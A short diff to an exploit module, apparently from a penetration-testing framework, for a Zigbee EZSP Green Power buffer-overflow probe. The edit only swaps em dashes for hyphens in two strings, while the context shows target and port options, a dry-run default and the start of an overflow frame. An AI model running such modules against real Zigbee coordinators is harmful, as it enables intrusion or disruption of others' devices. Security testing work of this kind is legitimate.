@@ -60,7 +60,7 @@ class Exploit(Exploit):
 
     target = OptIP("", "Zigbee coordinator host IP (EZSP/TCP or MQTT bridge)")
     port = OptPort(4901, "EZSP TCP port (Silicon Labs Z3GatewayHost default)")
-    dry_run = OptBool(True, "Dry run — show frame only")
+    dry_run = OptBool(True, "Dry run  -  show frame only")
     timeout = OptInteger(8, "Timeout in seconds")
 
     @mute
@@ -74,7 +74,7 @@ class Exploit(Exploit):
         host, port, timeout = str(self.target), int(self.port), float(self.timeout)
         dry_run = bool(self.dry_run)
 
-        print_status(f"Zigbee EZSP Green Power BOF probe — {_CVE}")
+        print_status(f"Zigbee EZSP Green Power BOF probe  -  {_CVE}")
 
         # Build minimal EZSP GP frame with overflow applicationID
         frame = b"\x00\x01\x00" + struct.pack("B", len(_GP_APPLICATION_ID_OVERFLOW)) + \
